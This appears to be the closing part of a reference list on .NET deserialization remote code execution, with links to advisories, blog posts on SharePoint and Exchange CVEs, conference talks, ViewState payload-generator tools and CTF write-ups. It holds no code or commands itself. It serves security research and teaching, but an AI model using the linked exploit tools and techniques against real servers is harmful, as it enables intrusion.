- https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters
- https://www.modzero.com/modlog/archives/2020/06/16/mz-20-03_-_new_security_advisory_regarding_vulnerabilities_in__net/index.html
- https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys
- https://www.zerodayinitiative.com/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability
- https://blog.liquidsec.net/2021/06/01/asp-net-cryptography-for-pentesters/
- https://peterjson.medium.com/some-notes-about-microsoft-exchange-deserialization-rce-cve-2021-42321-110d04e8852
- https://www.mdsec.co.uk/2021/09/nsa-meeting-proposal-for-proxyshell/
- https://medium.com/@frycos/searching-for-deserialization-protection-bypasses-in-microsoft-exchange-cve-2022-21969-bfa38f63a62d
- https://www.zerodayinitiative.com/blog/2021/3/17/cve-2021-27076-a-replay-style-deserialization-attack-against-sharepoint
- https://blog.assetnote.io/2021/11/02/sitecore-rce/
- https://web.archive.org/web/20220619183339/https://starlabs.sg/blog/2022/05/new-wine-in-old-bottle-microsoft-sharepoint-post-auth-deserialization-rce-cve-2022-29108/
- https://gmo-cybersecurity.com/blog/net-remoting-english/
- https://www.mdsec.co.uk/2022/03/abc-code-execution-for-veeam/
- https://www.mandiant.com/resources/hunting-deserialization-exploits
- https://mogwailabs.de/en/blog/2022/01/vulnerability-spotlight-rce-in-ajax.net-professional/
- https://testbnull.medium.com/some-notes-of-microsoft-exchange-deserialization-rce-cve-2021-42321-f6750243cdcd
- https://testbnull.medium.com/note-nhanh-v%E1%BB%81-binaryformatter-binder-v%C3%A0-cve-2022-23277-6510d469604c
- https://www.zerodayinitiative.com/blog/2023/9/21/finding-deserialization-bugs-in-the-solarwind-platform
- https://www.youtube.com/watch?v=ZcOZNAmKR0c&feature=youtu.be

### Talks:
- https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf
- https://speakerdeck.com/pwntester/attacking-net-serialization
- https://speakerdeck.com/pwntester/dot-net-serialization-detecting-and-defending-vulnerable-endpoints
- https://gosecure.github.io/presentations/2018-03-18-confoo_mtl/Security_boot_camp_for_.NET_developers_Confoo_v2.pdf
- https://illuminopi.com/assets/files/BSidesIowa_RCEvil.net_20190420.pdf
- https://nullcon.net/website/archives/pdf/goa-2018/rohit-slides.pdf

### Tools:
- https://github.com/pwntester/ViewStatePayloadGenerator
- https://github.com/0xACB/viewgen
- https://github.com/Illuminopi/RCEvil.NET

### CTF write-ups:
- https://cyku.tw/ctf-hitcon-2018-why-so-serials/
- https://xz.aliyun.com/t/3019
